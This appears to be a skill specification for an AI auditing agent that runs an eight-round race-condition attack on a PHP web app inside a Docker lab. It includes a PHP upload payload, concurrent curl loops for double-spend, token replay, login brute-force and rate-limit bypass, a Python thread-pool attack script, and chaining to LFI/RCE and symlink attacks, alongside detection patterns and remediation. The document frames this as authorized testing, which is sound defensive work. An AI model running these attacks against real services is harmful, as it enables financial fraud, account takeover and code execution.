## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-052-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 8-round progressive attack against race condition (TOCTOU) sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 8 attack rounds — if stuck after round 6, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST send concurrent requests (≥5 threads) and verify inconsistent state (duplicate records, double-spend, corrupted data) — sequential success does not prove race | FAIL — sequential test cannot demonstrate concurrency bug |

## 8-Round Attack
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly



#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - File Upload Race

Objective: Exploit the time window between upload, check, and deletion.

Steps:
1. Identify the upload flow: Save file → Security check → Delete if invalid
2. Construct a PHP Webshell as upload content:
   ```php
   <?php file_put_contents('/var/www/html/race_proof.php', '<?php echo "RACE_WIN"; ?>'); ?>
   ```
3. Concurrent attack (using curl loop inside Docker):
   ```bash
   # Window 1: High-speed loop uploading malicious files
   for i in $(seq 1 200); do
     curl -s -F "file=@shell.php" http://nginx:80/upload &
   done

   # Window 2: High-speed loop accessing uploaded files
   for i in $(seq 1 500); do
     curl -s http://nginx:80/uploads/shell.php &
   done
   ```
4. Execute verification command: `docker exec php cat /var/www/html/race_proof.php`

**Success criteria:** The uploaded PHP file was successfully executed before deletion.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Double Spend / Balance Overdraft

Objective: Bypass balance/inventory checks via concurrent requests.

Steps:
1. Query current balance/inventory (e.g., balance=100)
2. Construct a deduction request (e.g., purchase amount=100)
3. Concurrently send 10-50 identical deduction requests:
   ```bash
   for i in $(seq 1 30); do
     curl -s -X POST http://nginx:80/api/purchase \
       -H "Cookie: $SESSION" \
       -d '{"item_id":1,"quantity":1}' &
   done
   wait
   ```
4. Query the final balance; if negative, confirm by comparing balance differences
5. Compare order count against original inventory

**Success criteria:** Balance becomes negative, or the number of successful orders exceeds inventory.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - One-Time Token Replay

Objective: Concurrently use the same one-time token.

Steps:
1. Obtain a valid one-time token (password reset/verification code/CSRF)
2. Simultaneously send multiple requests using that token:
   ```bash
   TOKEN="abc123"
   for i in $(seq 1 20); do
     curl -s -X POST http://nginx:80/api/reset-password \
       -d "token=$TOKEN&password=newpass_$i" &
   done
   wait
   ```
3. Count the number of successful requests

**Success criteria:** The same one-time token was successfully used multiple times.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - Coupon / Points Double Redemption

Objective: Concurrently redeem the same coupon or points.

Steps:
1. Obtain a valid coupon code or points balance
2. Concurrently send redemption requests
3. Compare responses to confirm whether the discount was applied multiple times
4. Query the database to confirm whether points were consumed multiple times

Variants:
- Same coupon used concurrently across different orders
- Points redemption + points query concurrent (reading stale balance)
- Concurrent bypass of one-time-use invitation codes

**Success criteria:** Coupon applied multiple times, or points consumed multiple times.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Rate Limit Bypass

Objective: Bypass rate limits via concurrent requests.

Steps:
1. Identify rate-limited endpoints (login, API, verification code sending)
2. Determine the rate limit threshold (e.g., 5 times/minute)
3. Concurrently send requests exceeding the threshold within a very short time:
   ```bash
   # Send 20 requests within 100ms
   for i in $(seq 1 20); do
     curl -s -X POST http://nginx:80/api/login \
       -d "username=admin&password=guess_$i" &
   done
   wait
   ```
4. Count the number of successful responses

Implementation analysis:
- Is `Redis::incr()` atomic?
- Non-atomic `GET → compare → INCR` pattern
- Database `UPDATE attempts SET count=count+1 WHERE ...` without transaction lock

**Success criteria:** The number of successful requests exceeds the rate limit threshold.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Database Transaction Race

Objective: Exploit race conditions caused by insufficient database transaction isolation levels.

Analysis:
1. Query transaction isolation level:
   ```sql
   SELECT @@transaction_isolation;  -- MySQL
   SHOW default_transaction_isolation;  -- PostgreSQL
   ```
2. Search for `SELECT ... FOR UPDATE` pessimistic locks
3. Search for optimistic locks (version field)

Attack:
- **Dirty read**: Reading uncommitted balance under `READ UNCOMMITTED`
- **Non-repeatable read**: Data modified between two reads within a transaction
- **Phantom read**: `INSERT` operation bypasses `SELECT` check

```bash
# Concurrent transfer test
for i in $(seq 1 20); do
  curl -s -X POST http://nginx:80/api/transfer \
    -H "Cookie: $SESSION" \
    -d '{"to_user":2,"amount":100}' &
done
wait
# Compare: sender balance + receiver balance ≠ pre-transfer total → race confirmed
```

**Success criteria:** Data inconsistency (total amount not conserved, phantom records appear).


#### R7 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R7 - Session Race

Objective: Concurrent Session modifications causing data inconsistency.

Steps:
1. Locate the PHP Session Handler (file/Redis/database)
2. Search for `session_write_close()` calls
3. Construct concurrent requests modifying different Session fields:
   ```bash
   # Request A: Set cart = [item1]
   # Request B: Set cart = [item2]
   # Send concurrently, compare final cart for data loss
   ```
4. File Session: Concurrent writes without locks causing data corruption
5. Redis Session: Non-atomic GET+SET causing overwrites

Variants:
- Concurrent shopping cart item additions
- Concurrent login with different accounts (Session fixation)
- Concurrent user preference modifications

**Success criteria:** Session data loss or inconsistency.


#### R8 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R8 - Combined Race Chain

Chaining multiple race condition vulnerabilities:

1. **Race registration + Privilege escalation**: Concurrent registration with the same username → Later registrant inherits earlier registrant's permissions
2. **Race transfer + Balance overdraft + Withdrawal**: Withdraw immediately after overdraft, balance not updated before withdrawal
3. **File race + LFI**: Race write to temp file → LFI include → RCE
4. **Token replay + Password reset**: Same reset token concurrently resets multiple user passwords
5. **Rate limit bypass + Brute force**: Bypass login rate limit → Password enumeration

**Success criteria:** Complete race condition exploitation chain from discovery to final impact.

## Concurrency Tools

### In-Docker Concurrency
```bash
# Method 1: bash concurrency
for i in $(seq 1 N); do curl ... & done; wait

# Method 2: GNU parallel (if available)
seq 1 N | parallel -j 50 curl -s ...

# Method 3: Python script
docker exec php python3 -c "
import concurrent.futures, requests
def attack(i):
    return requests.post('http://nginx:80/api/endpoint', data={...})
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as e:
    results = list(e.map(attack, range(100)))
print(f'Success: {sum(1 for r in results if r.status_code==200)}')
"
```

### Time Synchronization Techniques
- Use `Connection: keep-alive` + HTTP pipelining to reduce network latency variance
- Use `Last-Byte Sync` technique: All requests hold back the last byte → Send simultaneously
- Docker internal network latency is extremely low (< 1ms), naturally suited for race condition testing

## Evidence Collection

```bash
# Balance check
docker exec php curl -s http://nginx:80/api/balance
# Expected: Negative balance or data inconsistency

# File check
docker exec php ls /var/www/html/race_proof*
docker exec php cat /var/www/html/race_proof.php

# Database check
docker exec db mysql -e "SELECT SUM(balance) FROM accounts;"
# Expected: Total inconsistent with initial value
```

Evidence standards:
- Balance is negative → **confirmed**
- One-time token used multiple times → **confirmed**
- File race successfully executed code → **confirmed**
- Rate limit bypassed (request count > threshold) → **confirmed**
- Theoretical analysis only without actual verification → **suspected**

## Physical Evidence Requirements

| Evidence Type | Example |
|---|---|
| Balance overdraft | Balance changed from 100 to -200, transfer succeeded 3 times |
| Token replay | Same reset token successfully reset password 5 times |
| File race | race_proof.php was created and accessible |
| Rate limit bypass | 15 successful login attempts within 60 seconds (limit is 5) |
| Data inconsistency | Total amount not conserved before and after transfers |

## Report Format

```json
{
  "vuln_type": "RaceCondition",
  "sub_type": "toctou|double_spend|token_replay|rate_limit_bypass|session_race|db_transaction",
  "round": 2,
  "endpoint": "POST /api/purchase",
  "concurrent_requests": 30,
  "success_count": 5,
  "evidence": "Balance changed from 100 to -400, 5 orders placed successfully",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Financial loss|Inventory overselling|Authentication bypass|Rate limit failure",
  "remediation": "Use database pessimistic lock SELECT FOR UPDATE, Redis atomic operations WATCH/MULTI, use flock() for file operations, use atomic DELETE with returned row count for token validation"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential race condition vulnerabilities:
- Pattern 1: `$balance = getBalance($uid); if($balance >= $amount) { deduct($uid, $amount); }` — Non-atomic read-check-write operation, concurrent requests can deduct multiple times
- Pattern 2: `if(!Token::where('token', $t)->exists()) { abort(); } Token::where('token', $t)->delete();` — Non-atomic check-then-delete, one-time token can be reused concurrently
- Pattern 3: `move_uploaded_file($tmp, $path); if(!isValid($path)) { unlink($path); }` — Post-upload validation has a time window, malicious file accessible during the race
- Pattern 4: `$count = Order::where('promo', $code)->count(); if($count < $limit) { Order::create(...); }` — Non-atomic count check for coupons/limited resources
- Pattern 5: `file_get_contents($file)` ... `file_put_contents($file, $newContent)` — File read/write without `flock()`, concurrent writes cause data corruption or condition bypass

## Key Insight

> **Key point**: The core pattern of race conditions is the non-atomic "check-then-act" (TOCTOU) operation. When auditing, identify all business logic involving balances/inventory/tokens/quotas and analyze whether reads and writes are completed within the same transaction/lock. The key to defense is database-level `SELECT ... FOR UPDATE` (pessimistic locking) or `UPDATE ... WHERE balance >= amount` (atomic conditional update), not application-level if-then-update.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Reconnaissance: Re-read target code to find overlooked filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other specialists
3. Decision tree matching: Select new attack directions based on failure patterns in `shared/pivot_strategy.md`
4. Terminate early when no new paths are found to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be completed)

The output `exploits/{sink_id}.json` MUST contain the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for this route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RACE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract References (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_RACE_CRITICAL_SECTION` — Critical section location ✅ Required
- `EVID_RACE_SHARED_RESOURCE` — Shared resource ✅ Required
- `EVID_RACE_WINDOW_ANALYSIS` — Race window analysis ✅ Required
- `EVID_RACE_STATISTICAL_RESULT` — Statistical result evidence (required for confirmed)

Missing required EVID → Conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` for write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format specified in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Report Format` above is the per-round internal recording format; the final output MUST be consolidated into the exploit.json structure.

## Collaboration

- Pass file race findings to the File Write Auditor and the LFI Auditor
- Pass rate limit bypass findings to the Authorization Auditor (brute force scenarios)
- Pass token replay findings to the Authentication Auditor
- Submit all findings to the QA Reviewer for physical evidence verification

## File System Operation Security Extension

In addition to traditional race conditions, file system operation security flaws MUST also be audited:

### chmod/chown Race

When code creates a file first then sets permissions, a TOCTOU window exists:

```php
// Dangerous pattern: Window between creation and permission setting
file_put_contents('/tmp/sensitive.dat', $data);  // Default 0644
chmod('/tmp/sensitive.dat', 0600);                // Other users can read during the window
```

Attack strategies:
- Concurrently monitor the target directory (`inotifywait`), read between file creation and chmod
- Pay special attention to file creation after `umask(0)` (overly permissive)
- Analyze the `$mode` parameter of `mkdir()` (default 0777)

### Symlink Attack

When code operates on user-controllable paths, symlinks can lead to arbitrary file read/write:

```php
// Dangerous pattern: Symlink not verified
if (file_exists($userPath)) {
    $content = file_get_contents($userPath);  // If $userPath is a symlink pointing to /etc/passwd
}
```

Detection points:
- Search for `is_link()` calls
- Whether `realpath()` is used for path canonicalization
- Usage difference between `lstat()` vs `stat()`
- `file_exists()` / `is_file()` follow symlinks (dangerous)
- Symlink hijacking when temporary files are created in shared directories (`/tmp`, `sys_get_temp_dir()`)
- Race window for `tempnam()` + `unlink()` + symlink replacement

Attack strategies:
- R-SYM-1: Pre-place a symlink at the target path pointing to a sensitive file
- R-SYM-2: Race replacement — Replace with a symlink between `file_exists()` check and `file_get_contents()` read
- R-SYM-3: Directory symlink — Replace intermediate path in `mkdir -p` with a symlink to write to arbitrary locations

### Directory Traversal via File System Operations

```php
// Dangerous pattern: File operation path concatenation
$path = $uploadDir . '/' . $_GET['filename'];
unlink($path);  // Arbitrary file deletion
copy($path, $dest);  // Arbitrary file copy
rename($path, $newPath);  // Arbitrary file move
```

Detection function list:
- `unlink($userPath)` — Arbitrary file deletion
- `copy($src, $dst)` where $src or $dst is user-controllable — Arbitrary file copy
- `rename($old, $new)` — Arbitrary file move/overwrite
- `rmdir($userPath)` — Arbitrary directory deletion
- `glob($pattern)` where $pattern is user-controllable — Directory enumeration
- `scandir($userPath)` — Directory listing disclosure
- `DirectoryIterator($userPath)` — Same as above

### Evidence Collection

1. Locate file system operation code (chmod/chown/symlink/unlink/copy/rename)
2. Analyze whether path parameters go through `realpath()` + base directory validation
3. Search for `is_link()` usage to prevent symlink following
4. Concurrency test chmod/chown race windows (time gap between creation and permission setting)
5. Analyze whether temporary file operations use secure `tmpfile()` or `sys_get_temp_dir()` + random filenames

## Constraints

- A Docker snapshot MUST be created before each round of testing, and rolled back after testing (see `shared/docker_snapshot.md`)
- Maximum concurrent requests is 100 to avoid container OOM
- Race condition testing is inherently non-deterministic; each scenario MUST be repeated at least 3 times
- Confirming a race requires a success rate > 20% (not sporadic); otherwise mark as suspected
- Race condition testing MUST NOT be executed against production environments


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

## Examples

### ✅ GOOD Output Example

```json
{
  "sink_id": "RACE-001",
  "vuln_type": "RaceCondition",
  "sub_type": "double_spend",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "confirmed_round": 2,
  "endpoint": "POST /api/purchase",
  "concurrent_requests": 30,
  "success_count": 5,
  "payload": "30 concurrent POST /api/purchase with item_id=1, quantity=1",
  "evidence": "EVID_RACE_CRITICAL_SECTION: OrderController.php:87 — $balance=getBalance(); if($balance>=$price){deduct($price);}; EVID_RACE_SHARED_RESOURCE: user_balance column in accounts table; EVID_RACE_WINDOW_ANALYSIS: 3-statement gap between SELECT and UPDATE without FOR UPDATE; EVID_RACE_STATISTICAL_RESULT: 5/30 requests succeeded, balance went from 100 to -400",
  "confidence": "confirmed",
  "impact": "Financial loss — balance overdraft by 500 units",
  "prerequisite_conditions": { "auth_requirement": "authenticated", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 2, "impact": 3, "complexity": 2, "score": 2.30, "cvss": 7.7, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "RACE-001",
  "vuln_type": "RaceCondition",
  "final_verdict": "confirmed",
  "evidence": "The code does not use locks",
  "severity": { "level": "H" }
}
// ❌ No sub_type, no concurrent_requests/success_count
// ❌ evidence is static analysis only — no actual race execution proof
// ❌ Missing EVID_RACE_STATISTICAL_RESULT (required for confirmed)
// ❌ severity missing numeric scores and reasons
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); continue only after all are ✅
2. Execute the specialized self-check items below (S1-S3); submit only after all are ✅
3. Any item ❌ → Correct and re-check; MUST NOT skip

### Specialized Self-Check (Race Condition Auditor Specific)
- [ ] S1: Specific code location of the race window (read-modify-write sequence) has been annotated
- [ ] S2: Concurrent request count and success rate have been quantified
- [ ] S3: Specific analysis of missing lock mechanisms has been documented

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Timing window too narrow to exploit reliably | Increase concurrent request count, reduce payload size; if still fails → record `"status": "window_too_narrow"` |
| Database lock prevents concurrent modification | Test with optimistic locking bypass or transaction isolation exploit; if locked → record `"status": "db_locked"` |
| Non-deterministic results across repeated attempts | Run 5 iterations minimum, use statistical majority; note confidence level in scoring |
| Thread/process pool exhaustion during concurrent requests | Reduce concurrency, stagger request timing, retry with smaller batch |
